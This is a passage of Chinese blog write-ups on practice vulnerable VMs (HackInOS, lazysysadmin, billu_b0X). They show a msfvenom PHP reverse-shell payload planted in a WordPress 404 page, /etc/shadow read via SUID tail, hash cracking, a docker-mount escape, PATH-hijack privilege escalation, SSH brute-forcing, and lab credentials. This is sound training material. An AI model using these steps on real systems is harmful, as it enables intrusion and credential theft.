class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>file =<span class="hljs-string">&quot;3.php&quot;</span>+<span class="hljs-built_in">str</span>(i)<br><span class="hljs-built_in">hash</span>=hashlib.md5(file.encode())<br><span class="hljs-built_in">dir</span>=<span class="hljs-built_in">hash</span>.hexdigest()+<span class="hljs-string">&quot;.php&quot;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;zd1.txt&quot;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>f.write(<span class="hljs-built_in">dir</span>+<span class="hljs-string">&quot;\r\n&quot;</span>)<br>f.close()<br></code></pre></td></tr></table></figure><p>然后使用dirb进行遍历</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirb</span> <span class="hljs-string">&quot;http://192.168.1.136:8000/uploads&quot;</span> zd<span class="hljs-number">1</span>.txt <br></code></pre></td></tr></table></figure><p>成功检索到目标文件时如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119121654712.png" alt="image-20210119121654712"></p><p>监听端会返回过来一个shell</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119121835591.png" alt="image-20210119121835591"></p><p>因为网站为wordpress搭建，其数据库信息存放在wp-config.php内，直接用cat就可以查看，可以看到数据库用户名和密码均为wordpress</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119210214722.png" alt="image-20210119210214722"></p><p>此时我们可以查看下系统信息，判断服务是否运行在容器内</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sysinfo</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119122229654.png" alt="image-20210119122229654"></p><p>主机名为1afdd1f6b82c，像是在容器中运行，确认一下，确实运行在docker中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">run post<span class="hljs-regexp">/linux/g</span>ather/checkcontainer<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119124814004.png" alt="image-20210119124814004"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>虽然是在docker中，但现在我们也只有进行提权才能进一步想办法拿到主机shell</p><p>先上传一个Linux信息收集脚本 下载地址 <a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">meterpreter &gt; upload ~<span class="hljs-regexp">/桌面/</span>linuxprivchecker.py <span class="hljs-regexp">/tmp/</span>linuxprivchecker.py<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119191530441.png" alt="image-20210119191530441"></p><p>这个脚本会提供给我们很多信息，包括我们此时最需要的设置了suid的命令，如下图，tail命令被设置了suid</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119195222880.png" alt="image-20210119195222880"></p><p>直接用cat来查看shadow文件是查看不了的，所以我们可以用tail来查看shadow文件，可以看到root的用户名密码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tail -c1G <span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119202436084.png" alt="image-20210119202436084"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>:$<span class="hljs-number">6</span>$qoj<span class="hljs-number">6</span>/JJi$FQe/BZlfZV<span class="hljs-number">9</span>VX<span class="hljs-number">8</span>m<span class="hljs-number">0</span>i<span class="hljs-number">25</span>Suih<span class="hljs-number">5</span>vi<span class="hljs-number">1</span>S//OVNpd.PvEVYcL<span class="hljs-number">1</span>bWSrF<span class="hljs-number">3</span>XTVTF<span class="hljs-number">91</span>n<span class="hljs-number">60</span>yUuUMUcP<span class="hljs-number">65</span>EgT<span class="hljs-number">8</span>HfjLyjGHova/:<span class="hljs-number">17951</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></td></tr></table></figure><p>之后使用hashcat破解密码，将得到的用户名密码hash值存放在文件root.hash中，使用hashcat进行破解</p><p><img src="D:\blog\hexo\source_posts\HackInOS靶机练习.assets\image-20210119205313412.png" alt="image-20210119205313412"></p><p> 命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -w <span class="hljs-number">3</span> -a <span class="hljs-number">0</span> -m <span class="hljs-number">1800</span> -o root.out root.hash<br></code></pre></td></tr></table></figure><p>此处参数，-w 调优，-a 指定要使用的破解模式，其值参考后面对参数。””-a 0”字典攻击，”-a 1” 组合攻击；”-a 3”掩码 攻击。 -m 1800 = SHA-512(Unix)</p><p>得到存有破解密码的文件root.out，查看密码为john</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119205430472.png" alt="image-20210119205430472"></p><p>此处我们切换为root用户时需要使用到一个交互shell</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119205604832.png" alt="image-20210119205604832"></p><p>此时docker内提权成功</p><h3 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h3><p>有了root权限我们可以查看数据库了，用之前获取的数据库用户名和密码登录mysql</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql -h db -u wordpress -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119211110829.png" alt="image-20210119211110829"></p><p>从上图中可以看到一个host_ssh_cred表，看起来像是ssh连接，查看下这个表，果然，从里面可以看到一组用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119211300651.png" alt="image-20210119211300651"></p><p>密码由md5加密，将其解密后，得到明文12345</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119211535316.png" alt="image-20210119211535316"></p><p>使用ssh登录，登录成功</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> hummingbirdscyber@<span class="hljs-number">192.168.1.136</span> <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119213653055.png" alt="image-20210119213653055"></p><p>登录后查看用户组，属于docker组，逃逸成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119213846779.png" alt="image-20210119213846779"></p><h3 id="二次提权"><a href="#二次提权" class="headerlink" title="二次提权"></a>二次提权</h3><p>此时我们直接将root目录挂载至容器内，即可查看root下的文件</p><p>如图，成功拿到flag</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker <span class="hljs-built_in">run</span> -<span class="hljs-keyword">it</span> -v /root:/root ubuntu:latest<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119214126336.png" alt="image-20210119214126336"></p><p>但此时我们还没有真正拿到root权限，继续进行提权</p><p>查看一下设置了suid的文件</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">ls -lh <span class="hljs-constructor">$(<span class="hljs-params">find</span> <span class="hljs-operator">/</span> -<span class="hljs-params">perm</span> -<span class="hljs-params">u</span>=<span class="hljs-params">s</span> -<span class="hljs-params">type</span> <span class="hljs-params">f</span> 2&gt;<span class="hljs-operator">/</span><span class="hljs-params">dev</span><span class="hljs-operator">/</span><span class="hljs-params">null</span>)</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119214326397.png" alt="image-20210119214326397"></p><p>可以看到一个a.out，此文件显然是人为创建的可执行文件，运行一下看看，看到返回了结果root</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>hummingbirdscyber<span class="hljs-regexp">/Desktop/</span>a.out<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119214610108.png" alt="image-20210119214610108"></p><p>我们不清楚这个文件的内容，但其执行结果仅返回了一个用户名，猜测调用了whoami文件</p><p>查看一下环境变量，可以看到/home/hummingbirdscyber/bin，此目录我们是有写权限的</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119214939395.png" alt="image-20210119214939395"></p><p>我们可以自行编写一个whoami文件，因为我们猜测a.out中使用了whoami命令，而环境变量中又有一个我们具有写权限的目录，此时如果我们伪造一个whoami文件，a.out在调用命令时首先检索环境变量就会调用到我们伪造的whoami，执行我们想要的命令，来达到提权的效果，即使用环境变量进行命令劫持提权</p><p>此处whoami中的内容为返回一个shell，还需要说明一点，因为执行a.out的时候返回的是root，因此怀疑是使用root的权限来调用了whoami，此时我们如果能够获取到shell，则可以拿到root权限</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl">hummingbirdscyber@vulnvm:~/Desktop$ nano whoami.c      <br>hummingbirdscyber@vulnvm:~/Desktop$ cat whoami.c<br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-keyword">int</span> main(void) &#123;<br>    <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>hummingbirdscyber@vulnvm:~<span class="hljs-regexp">/Desktop$ gcc -o whoami whoami.c  /</span>/编译<br>hummingbirdscyber@vulnvm:~<span class="hljs-regexp">/Desktop$ chmod +x whoami         /</span>/赋予执行权限<br></code></pre></td></tr></table></figure><p>我们到hummingbirdscybe目录下，创建一个bin目录，然后将之前编译好的whoami移动到bin目录下</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">hummingbirdscyber<span class="hljs-variable">@vulnvm</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>mkdir bin<br>hummingbirdscyber<span class="hljs-variable">@vulnvm</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>mv Desktop/whoami bin/<br></code></pre></td></tr></table></figure><p>执行a.out，前面的用户名变为了root</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119220402541.png" alt="image-20210119220402541"></p><p>查看flag，无误，提权成功</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210119220542728.png" alt="image-20210119220542728" style="zoom: 67%;" />]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lazysysadmin靶机练习</title>
    <link href="/2021/04/28/lazysysadmin%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/04/28/lazysysadmin%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="lazysysadmin靶机练习"><a href="#lazysysadmin靶机练习" class="headerlink" title="lazysysadmin靶机练习"></a>lazysysadmin靶机练习</h3><h4 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h4><p>环境搭建平台为VMware15，网络为nat模式，网段192.168.1.0/24</p><p>网络由攻击机kali、靶机组成</p><p>靶机ip：192.168.1.138</p><p>kali linux ip：192.168.1.137</p><h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>主机发现：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/%E6%B5%8B%E8%AF%95.png" alt="image-20210127195115436"></p><p>端口扫描：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV <span class="hljs-number">192.168.1.138</span><br></code></pre></td></tr></table></figure><p>可以看到目标主机开放了samba服务，先放着一会再看</p><p><img src="E:\大三上作业练习\web安全\web练习\lazysysadmin靶机练习\lazysysadmin靶机练习.assets\image-20210128221658996.png" alt="image-20210128221658996"></p><p>目录爆破：</p><p>这里用了kali里已有的dirb进行目录遍历</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb <span class="hljs-string">&quot;http://192.168.1.138&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirb/</span>wordlists/big.txt<br></code></pre></td></tr></table></figure><p>可以看到有一个wordpress目录，猜想网站是wordpress架构的，另外有一个phpmyadmin目录，大概可以登录管理数据库</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130102741766.png" alt="image-20210130102741766"></p><p>直接访问80端口，跳转到一个近似静态的页面，几乎没有什么互动性，也不会跳转到其他页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130222825295.png" alt="image-20210130222825295"></p><p>查看一下robots.txt</p><p>显示出来的目录和我们用dirb爆破出的基本一致</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130224040160.png" alt="image-20210130224040160"></p><p>依次访问我们之前爆破出的目录，看看有什么有用的信息</p><p>访问<a href="http://192.168.1.138/wordpress/wp-admin/%E6%97%B6%E4%BC%9A%E8%B7%B3%E8%BD%AC%E5%88%B0%E4%B8%80%E4%B8%AA%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E8%B4%A6%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%EF%BC%8C%E5%85%88%E6%94%BE%E7%9D%80">http://192.168.1.138/wordpress/wp-admin/时会跳转到一个后台管理登录页面，不知道账户名密码，先放着</a></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130222411433.png" alt="image-20210130222411433"></p><p>访问<a href="http://192.168.1.138/phpmyadmin/%E4%BC%9A%E8%B7%B3%E8%BD%AC%E5%88%B0phpmyadmin%EF%BC%8C%E4%BE%9D%E6%97%A7%E6%94%BE%E5%9C%A8%E4%B8%80%E8%BE%B9">http://192.168.1.138/phpmyadmin/会跳转到phpmyadmin，依旧放在一边</a></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130222610561.png" alt="image-20210130222610561"></p><p>直接访问wordpress目录会到一个可留言的web页面，内容全部是my name is togie看起来像是个博客之类的，翻到底下还可以看见评论</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130224307649.png" alt="image-20210130224307649"></p><h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>网站上并没有发现什么特别有用的信息，除了看到一个togie，疑似用户名，可以尝试ssh爆破，其他地方没有很明显的漏洞点，我们之前扫描端口的时候发现了靶机开放，连上去看一看</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smb:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.138</span>/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130224846851.png" alt="image-20210130224846851"></p><p>点进共享文件夹后，可以看到里面的这些目录，和我们爆破到的网站目录基本一致，既然如此，可以看看有没有我们想要找的配置文件，比如说wp-congfig.php之类的</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130225107101.png" alt="image-20210130225107101"></p><p>果然有，打开以后找到我们想要的数据库用户名密码</p><p>Admin、TogieMYSQL12345^^</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210130225244557.png" alt="image-20210130225244557"></p><p>还可以在一个deets.txt文件里看到一串密码12345，暂时不知道有什么用</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223946613.png" alt="image-20210131223946613"></p><p>分别登录到之前找到的phpmyadmin页面和wordpress后台管理页面</p><p>phpmyadmin很明显是没给权限，这里查不了数据表</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131222828646.png" alt="image-20210131222828646"></p><p>再登录下后台试试，登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223001074.png" alt="image-20210131223001074"></p><p>进到后台之后挨个页面查看，可以看到一个页面可以修改部分页面代码，如下图，我们可以看到一个404.php，点进去看一下</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223240722.png" alt="image-20210131223240722"></p><p>看了这个页面内容后，这是一个显示访问页面不存在的一个跳转页面，我们测试一下猜想，在/wordpress路径下随便提交个不存在的参数</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223710635.png" alt="image-20210131223710635"></p><p>可以看到，上下两图的回显内容是一样的，是此页面对应的源码没错</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223637610.png" alt="image-20210131223637610"></p><p>既然这里可以修改源码，那我们可以在这里换上我们的代码，反弹一个shell回来</p><p>先用msf制作一个反弹shell的php木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p php/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.1.137 <span class="hljs-attribute">lport</span>=4444 -f<span class="hljs-built_in"> raw </span>&gt; 1.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210113200422878.png" alt="image-20210113200422878"></p><p>生成木马如下图，ip地址为kali的ip，端口号4444为kali要监听的端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210113200652237.png" alt="image-20210113200652237"></p><p>我们把这个代码内容粘贴到之前的那个404.php里</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131224448320.png" alt="image-20210131224448320"></p><p>点击update更新</p><p>然后在kali端监听端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131224649182.png" alt="image-20210131224649182"></p><p>再次刷新之前那个显示notfound的页面，反弹成功，查看下信息，无误</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131224904654.png" alt="image-20210131224904654"></p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>提权用到了之前的那个deets.txt里提到的密码12345，以及/wordpress路径下主页面反复提到的my name is togie(讲实话这个地方一串这个有点吓人)</p><p>言归正传，是在参考了网上其他writeup后发现了这个密码12345和togie的联系和用处(文章末尾附参考链接)，首先我们利用已经获取到的shell，在获取一个交互shell，以使用su命令</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131225911932.png" alt="image-20210131225911932"></p><p>当我们转换到togie用户后会惊喜的发现，他可以直接转root用户，至此提权完毕，整个渗透过程也已经完成了</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131230343421.png" alt="image-20210131230343421"></p><p>提权过程出乎意料的短，整个靶机的渗透过程相对其他靶机也显得稍有些简单，但一切简单全都源于后台放了一个含密码的deets.txt文件在网站wordpress根目录下，此处提到推出服务器后，记得删除该文件，并及时更新密码，但管理员并没有这样做，这也就是lazysysadmin的含义了吧，也是我们平时很容易犯的错误。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131230650845.png" alt="image-20210131230650845"></p><h4 id="其他思路："><a href="#其他思路：" class="headerlink" title="其他思路："></a>其他思路：</h4><p>其实刚刚进到wordpress路径下的时候看到那个togie用户名就可以尝试ssh爆破一下的，后来我们看到的那个密码12345强度也相当弱，用网上找的到的大多数字典也都可以爆破的出</p><p>依旧是用msf，用ssh的爆破模块，这里用户名和密码的字典是分开的，用户名的字典里我自己添加了togie这个用户名</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131231448491.png" alt="image-20210131231448491"></p><p>很快就能爆破的出用户名密码 togie:12345</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131231923661.png" alt="image-20210131231923661"></p><p>ssh连接</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131231823832.png" alt="image-20210131231823832"></p><p>切换root用户</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131232113083.png" alt="image-20210131232113083"></p><p>文章参考：</p><p><a href="https://zhuanlan.zhihu.com/p/114916169">https://zhuanlan.zhihu.com/p/114916169</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶机练习-1：billu_b0X</title>
    <link href="/2021/04/27/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0-1%EF%BC%9Abillu-b0X/"/>
    <url>/2021/04/27/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0-1%EF%BC%9Abillu-b0X/</url>
    
    <content type="html"><![CDATA[<h2 id="靶机练习-1：billu-b0X"><a href="#靶机练习-1：billu-b0X" class="headerlink" title="靶机练习-1：billu_b0X"></a>靶机练习-1：billu_b0X</h2><h4 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h4><p>Billu_b0x，VMware虚拟机设置为nat模式，靶机自动获取ip地址</p><p>kali linux 2020虚拟机，ip地址192.168.1.137</p><h4 id="渗透步骤："><a href="#渗透步骤：" class="headerlink" title="渗透步骤："></a>渗透步骤：</h4><h5 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h5><h6 id="1-ip发现"><a href="#1-ip发现" class="headerlink" title="1.ip发现"></a>1.ip发现</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>使用nmap扫描本网段主机，其中192.168.1.1为网卡地址，192.168.1.3为网关，137为本机地址，</p><p>目标靶机ip为192.168.1.132</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_box%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0.png" alt="image-20201231224509510"></p><p>或者使用命令arp-scan -l扫描，效果相同，且不扫描本机</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231224634344.png" alt="image-20201231224634344"></p><h6 id="2-端口及服务扫描"><a href="#2-端口及服务扫描" class="headerlink" title="2.端口及服务扫描"></a>2.端口及服务扫描</h6><p>使用nmap进行端口和服务扫描，指定1-65535全端口，并添加参数A做服务识别和深度扫描，生成结果文件a.txt</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -A <span class="hljs-number">192.168.1.132</span> -<span class="hljs-literal">oN</span> a.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0X%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.png" alt="image-20201231224915291"></p><p>从上图中可以看到，靶机是一台ubuntu，开启http服务，访问上去看一下</p><p>show me your sqli skills:让展示一下注入技巧，sqlmap测试未果，再看看其他的目录</p><p>[<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0x%E4%B8%BB%E9%A1%B5.png" alt="DKKlKx.png">]</p><h6 id="3-目录及页面扫描"><a href="#3-目录及页面扫描" class="headerlink" title="3.目录及页面扫描"></a>3.目录及页面扫描</h6><p>用kali的dirb跑一下目录</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0x%20dirb%E6%89%AB%E6%8F%8F.png" alt="image-20201231225713412">+</p><p>同时windows用御剑跑一下，可以得到更多的爆破结果</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231230127563.png" alt="image-20201231230127563"></p><p>得到页面较多，test.php、add.php、in.php、c.php、index.php、show.php等，目录有：uploaded_images，phpmy，依次访问</p><h5 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h5><h6 id="1-访问test-php：页面提示file参数为空，需要提供file参数"><a href="#1-访问test-php：页面提示file参数为空，需要提供file参数" class="headerlink" title="1.访问test.php：页面提示file参数为空，需要提供file参数"></a>1.访问test.php：页面提示file参数为空，需要提供file参数</h6><p>测试一下文件下载，不行，会跳转回首页</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231230819189.png" alt="image-20201231230819189"></p><h6 id="2-在Firefox的Hackbar中，将get请求，变更为post请求，文件下载"><a href="#2-在Firefox的Hackbar中，将get请求，变更为post请求，文件下载" class="headerlink" title="2.在Firefox的Hackbar中，将get请求，变更为post请求，文件下载"></a>2.在Firefox的Hackbar中，将get请求，变更为post请求，文件下载</h6><p>成功，获得passwd文件，这里用burp改包也行，但是要麻烦一些，就直接hackbar了。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231231532879.png" alt="image-20201231231532879"></p><h6 id="3-通过同样文件包含的方法，下载add-php、in-php、c-php、index-php、show-php、panel-php等文件，后面可以访问文件的同时，审计文件的源代码。"><a href="#3-通过同样文件包含的方法，下载add-php、in-php、c-php、index-php、show-php、panel-php等文件，后面可以访问文件的同时，审计文件的源代码。" class="headerlink" title="3.通过同样文件包含的方法，下载add.php、in.php、c.php、index.php、show.php、panel.php等文件，后面可以访问文件的同时，审计文件的源代码。"></a>3.通过同样文件包含的方法，下载add.php、in.php、c.php、index.php、show.php、panel.php等文件，后面可以访问文件的同时，审计文件的源代码。</h6><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231231649579.png" alt="image-20201231231649579"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232504441.png" alt="image-20201231232504441"></p><ol start="4"><li><h6 id="查看passwd文件，发现1个id-1000的账号ica，ssh连接的用户名可以是ica或root"><a href="#查看passwd文件，发现1个id-1000的账号ica，ssh连接的用户名可以是ica或root" class="headerlink" title="查看passwd文件，发现1个id 1000的账号ica，ssh连接的用户名可以是ica或root"></a>查看passwd文件，发现1个id 1000的账号ica，ssh连接的用户名可以是ica或root</h6></li></ol><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232027735.png" alt="image-20201231232027735"></p><p>访问add.php、in.php页面和审计代码</p><p>add.php是一个上传界面，但是功能无法使用，查看源码文件发现只是个页面，没有后台处理代码。in.php是php info信息</p><p><img 